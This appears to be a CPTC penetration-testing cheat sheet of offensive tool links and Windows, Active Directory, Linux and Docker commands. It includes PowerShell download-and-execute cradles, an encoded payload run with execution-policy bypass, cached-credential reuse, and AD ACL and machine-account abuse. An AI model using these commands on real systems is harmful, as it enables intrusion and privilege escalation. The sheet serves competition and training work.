# **CPTC Reference Sheet**

## Windows / Active Directory

### **Tools**

#### [**Bloodhound CE Install**](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)

```bash
curl -L https://github.com/SpecterOps/BloodHound/raw/main/examples/docker-compose/docker-compose.yml | docker compose -f - up
```

#### [**Bloodhound-Python**](https://github.com/dirkjanm/BloodHound.py)

```bash
python3 -m pip install bloodhound
```

#### [**CrackMapExec**](https://github.com/byt3bl33d3r/CrackMapExec)

```bash
python3 -m pip install pipx 
python3 -m pipx install crackmapexec
python3 -m pipx ensurepath
```

#### [**Rubeus**](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)


[**Ghostpack Binaries**](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

#### [**ILSpy (Avalonial)**](https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip)

#### [**JAWS**](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1)

#### [**Kerbrute**](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)

#### [**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit) and [**PowerMad**](https://github.com/Kevin-Robertson/Powermad)

```bash
git clone https://github.com/PowerShellMafia/PowerSploit.git
```

```bash
git clone https://github.com/Kevin-Robertson/Powermad.git
```

#### [**WES-NG**](https://github.com/bitsadmin/wesng)

```bash
python3 -m pip install wesng
wes --update
```

#### [**WinPEAS_bat**](https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/winPEAS.bat) **/** [**WinPEAS_x64**](https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/winPEASx64.exe) **/** [**WinPEAS_x86**](https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/winPEASx86.exe) **/** [**WinPEAS_any**](https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/winPEASany.exe)

### **LDAPsearch**

**Comparison Operations**

```powershell
(&(objectClass=Group)(CN=Exchange*)); (|(objectClass=Group)(CN=Exchange*)); (!(&(objectClass=Group)(CN=Exchange*)))`
```

**Dump (No-Auth)**

```bash
ldapsearch -LLL -H ldap://<domain> -x -s base ""
```

**Full Dump (Authenticated)**

```bash
ldapsearch -LLL -H ldap://<domain> -x -w <passsword> -D '<user>@<domain>' -b 'DC=<domain>,DC=<tld>' "(objectClass=*)"
```

**Get All Groups / Group Members**

```bash
ldapsearch -LLL -H ldap://<domain> -x -w <passsword> -D '<user>@<domain>' -b 'DC=<domain>,DC=<tld>'  "(objectClass=Group)" member memberof
```

### **RPCClient**

```bash
rpcclient -U <user> --password=<password> -c <rpc-command> <host>
```
```
enumdomusers
querydominfo
samlookupnames <domain|builtin> <user>
queryuser <user_RID>
querygroupmem <group_RID>
samlookuprids
```

## **PowerShell**

[**Pentesting w/ PowerShell**](https://jonlabelle.com/snippets/view/markdown/basic-windows-powershell-commands-for-pentesting)

[**SANS PowerShell Cheat Sheet**](https://www.sans.org/blog/sans-pen-test-cheat-sheet-powershell/)

**Filter Output (Grep-Like)**

```powershell
select-string -Pattern '<regex>' | % {$_.matches.value})
```

**Download / Execute Files**

```powershell
Invoke-WebRequest -uri <url> -outfile <outputfile> # Just Download
```

```powershell
Invoke-Expression (New-Object Net.WebClient).downloadString("<url>")
```

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','<url>',$false)
$h.send()
iex $h.responseText
```

```powershell
$wr = [System.NET.WebRequest]::Create("<url>")
$r = $wr.GetResponse() 
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

**Mute Web Warning in PowerShell v3+**

```powershell
$Env:PSModulePath.Split(';') | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }
```

**Authenticate to Remote SMB Share**

```powershell
net use \\<ip>\<share> /user:<user> <password>
```

**Transfer Files From Share**

```powershell
ROBOCOPY \\<IP>\<SharePath> <Destination> -E /COPY:DAT

COPY \\<IP>\<SharePath> <Destination>
```

**Create PSCredential**

```powershell
$user = whoami
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
```

**B64 Encode / Decode**

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("myCommand"))
```
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JwBtAHkAUwB0AHIAaQBuAGcAJwA='))
```

**Execute B64 Encoded Payload**

```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://<host:port>/<filename>')" | iconv -t > UTF-16LE | base64 -w0

PS> powershell [-nop] -ep bypass -encodedCommand <Base64>
```

**Run PS as Different User** *(No profile)*

```powershell
runas /user:<domain>\<user> /noprofile powershell.exe
```

**Check for Cached Credentials**

```bat
cmdkey /list
```

**Use Saved Credential**

```powershell
C:\Windows\System32\runas.exe /user:<Domain>\<Username> /savecred <executable>
```

**Enum Local Users**

```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
```

**List Users Directory**

```powershell
Get-ChildItem C:\Users -Force | select Name
```

**Enumerate Object ACL**

```powershell
Get-Acl -Path "<File or Directory>" | fl
```
**Current OS Verison**

```powershell
[System.Environment]::OSVersion.Version
```

**List All Patches**

```powershell
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
```

**List Security Patches**

```powershell
Get-Hotfix -description "Security update"
```

**Check Clipboard**

```powershell   
Get-Clipboard
```

**Check Recycle Bin**

```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```

### ***PowerView***

**Get ACL for Object**

```powershell
Get-ObjectAcl -Identity "<dn>" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "<SID>"}`
```
**Grant Right to Domain Object**

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "<machine_account>" -Rights <RIGHT>
```

**Get Machine Account SID**

```powershell
$ComputerSid = Get-DomainComputer ohno -Properties objectsid | Select -Expand objectsid
```

### ***PowerMad***

**Add Machine Account**

```powershell
New-MachineAccount -MachineAccount <attacker> -Password $(ConvertTo-SecureString '<password>' -AsPlainText -Force)
```

### **Permissions / Policy**

[**ADACLScan**](https://github.com/canix1/ADACLScanner/releases/download/7.9/ADACLScan.ps1)

**Interesting ACE/DACL**

```
GenericAll - full rights to the object (add users to a group or reset user's password)
GenericWrite - update object's attributes (i.e logon script)
WriteOwner - change object owner to attacker controlled user take over the object
WriteDACL - modify object's ACEs and give attacker full control right over the object
AllExtendedRights - ability to add user to a group or reset password
ForceChangePassword - ability to change user's password
Self (Self-Membership) - ability to add yourself to a group
```

# Linux

### **Enumeration**

#### [**LinPEAS**](https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh)

#### [**LinEnum**](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

#### [**LES**](https://github.com/The-Z-Labs/linux-exploit-suggester.git)

## Docker

### **Enumeration**

[**CDK**](https://github.com/cdk-team/CDK/releases/download/v1.5.2/cdk_linux_amd64)

[**AmIContained**](https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64)

[**DEEPCE**](https://github.com/stealthcopter/deepce/raw/main/deepce.sh)

[**Grype**](https://raw.githubusercontent.com/anchore/grype/main/install.sh)

```bash
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b <InstallPath>
```
